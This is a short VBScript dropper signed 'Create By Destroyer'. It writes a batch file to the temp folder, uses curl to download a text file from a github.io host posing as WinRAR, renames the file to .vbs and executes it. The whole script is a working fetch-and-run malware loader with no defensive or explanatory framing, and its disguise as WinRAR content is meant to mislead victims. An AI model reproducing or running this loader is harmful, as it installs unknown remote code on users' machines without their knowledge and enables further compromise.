Const TemporaryFolder = 2

Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")

Dim tempFolder: tempFolder = fso.GetSpecialFolder(TemporaryFolder)

set b=createobject("wscript.shell")
Set objfso = createobject("scripting.filesystemobject")
Set ar= objfso.createtextfile(tempFolder & "archivo.bat",true)

ar.writeline " @echo OFF " : ar.writeline " cd %temp% " : ar.writeline " curl -o WinRARcurl.txt https://winrar-lab.github.io/Windows-7/WinRARcurl.txt " : ar.writeline " timeout 2 " : ar.writeline " cd %temp% " : ar.writeline " rename WinRARcurl.txt WinRARcurl.vbs " : ar.writeline " timeout 2 " : ar.writeline " start WinRARcurl.vbs  "
ar.close
b.run tempFolder & "archivo.bat", 1, true
'Create By Destroyer.
